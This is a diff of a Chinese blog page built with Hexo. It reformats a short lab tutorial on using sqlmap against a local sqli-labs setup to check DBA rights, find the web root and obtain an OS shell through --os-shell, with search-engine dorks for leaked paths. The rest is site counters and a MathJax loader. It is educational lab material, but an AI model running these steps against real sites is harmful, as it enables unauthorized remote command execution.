@@ -277,7 +277,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>601</span>
+              <span>591</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -297,41 +297,45 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>phpstudy + sqlilab 本地测试</p>
-<br>
-
-<h3 id="os-shell-条件"><a href="#os-shell-条件" class="headerlink" title="os-shell 条件"></a>os-shell 条件</h3><ol>
+        <h3 id="环境说明">环境说明</h3>
+<p>phpstudy + sqlilab 本地测试</p>
+<p><br></p>
+<h3 id="os-shell-条件">os-shell 条件</h3>
+<ol type="1">
 <li>网站必须为root权限</li>
 <li>知道网站绝对路径</li>
 <li>PHP关闭魔术引号(GPC)，php主动转义功能关闭</li>
 <li>secure_file_priv= 值为空</li>
 </ol>
-<br>
-
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="查看数据库权限是否为dba"><a href="#查看数据库权限是否为dba" class="headerlink" title="查看数据库权限是否为dba"></a>查看数据库权限是否为dba</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
+<p><br></p>
+<h3 id="利用">利用</h3>
+<h4 id="查看数据库权限是否为dba">查看数据库权限是否为dba</h4>
+<p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
 <p>current user is DBA: True</p>
 <p><img src="/posts/a92f908a/id_dba.png"></p>
-<br>
-
-<h4 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
+<p><br></p>
+<h4 id="寻找绝对路径">寻找绝对路径</h4>
+<p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
 <p><code>select @@datadir</code></p>
 <p><img src="/posts/a92f908a/dir.png"></p>
-<p>select @@datadir: ‘D:\phpstudy_pro\Extensions\MySQL5.7.26\data\‘</p>
+<p>select @<span class="citation" data-cites="datadir">@datadir</span>:
+'D:\phpstudy_pro\Extensions\MySQL5.7.26\data\'</p>
 <p>可以推测到 网站根目录 <code>D:\phpstudy_pro\WWW</code></p>
-<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
+<h4 id="os-shell">os-shell</h4>
+<p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
 <p>填入绝对路径</p>
 <p><img src="/posts/a92f908a/os_shell.png"></p>
 <p><img src="/posts/a92f908a/shell.png"></p>
-<br>
-
-<br>
-
-<h3 id="寻找网站绝对路径的方法"><a href="#寻找网站绝对路径的方法" class="headerlink" title="寻找网站绝对路径的方法:"></a>寻找网站绝对路径的方法:</h3><ul>
+<p><br></p>
+<p><br></p>
+<h3 id="寻找网站绝对路径的方法">寻找网站绝对路径的方法:</h3>
+<ul>
 <li>通过网站报错查看绝对路径</li>
 <li>根据phpinfo 探针查看信息</li>
-<li>配合远程代码执行漏洞  如eval() 传入phpinfo()</li>
-<li>根据配置文件获取路径 </li>
-<li>通过搜索引擎获取 <code>Site:test.com warning</code> <code>Site:test.com &quot;fatal error&quot;</code></li>
+<li>配合远程代码执行漏洞 如eval() 传入phpinfo()</li>
+<li>根据配置文件获取路径</li>
+<li>通过搜索引擎获取 <code>Site:test.com warning</code>
+<code>Site:test.com "fatal error"</code></li>
 </ul>
 
     </div>
@@ -478,7 +482,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -526,7 +530,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -540,7 +544,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -551,7 +555,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -691,6 +695,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
